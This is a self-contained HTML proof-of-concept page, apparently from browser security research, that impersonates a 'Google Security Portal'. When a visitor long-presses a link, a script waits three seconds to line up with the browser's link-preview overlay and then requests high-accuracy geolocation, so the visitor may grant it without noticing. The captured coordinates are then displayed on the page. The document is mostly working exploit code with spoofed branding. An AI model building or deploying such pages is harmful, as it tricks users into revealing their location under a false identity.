<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Long Press & Preview Page PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            max-width: 320px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dadce0;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
            display: none;
            text-align: left;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        .pulse {
            color: #34a853;
            font-weight: bold;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Long Press Preview Page & Action</h1>

    <!-- Target Link dengan atribut pratinjau asli (target="_blank") -->
    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Action</a>

    <!-- Info Box untuk menampilkan hasil ekstraksi/status -->
    <div class="info-box" id="infoBox">
        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
        <div id="coordDetails" style="margin-top: 8px;"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        const executeAction = () => {
            if (triggered) return;
            triggered = true;

            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            const coordDetails = document.getElementById("coordDetails");
            
            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Triggering preview page & acquiring context...";

            // Jeda waktu sinkronisasi dengan kemunculan preview page
            setTimeout(() => {
                try {
                    // Contoh aksi lanjutan (Geolocation / Data Capture)
                    if ("geolocation" in navigator) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                const accuracy = position.coords.accuracy;

                                statusText.className = "";
                                statusText.innerText = "Context Captured Successfully!";
                                coordDetails.innerHTML = `
                                    <b>Latitude:</b> ${lat}<br>
                                    <b>Longitude:</b> ${lon}<br>
                                    <b>Accuracy:</b> ±${accuracy} meters<br><br>
                                    <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
                                `;
                            },
                            (error) => {
                                statusText.className = "";
                                statusText.innerText = `Geolocation error: ${error.message}`;
                            },
                            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                        );
                    }
                } catch (err) {
                    console.debug("Execution error:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1000);
                }
            }, 3000);
        };

        // Event listener long-press (contextmenu) pada link pratinjau
        const targetElement = document.getElementById("targetLink");
        
        targetElement.addEventListener("contextmenu", (e) => {
            // Tanpa e.preventDefault() agar menu konteks / preview page asli tetap berjalan bersamaan
            executeAction();
        });

        targetElement.addEventListener("touchstart", () => {}, { passive: true });
    </script>

</body>
</html>
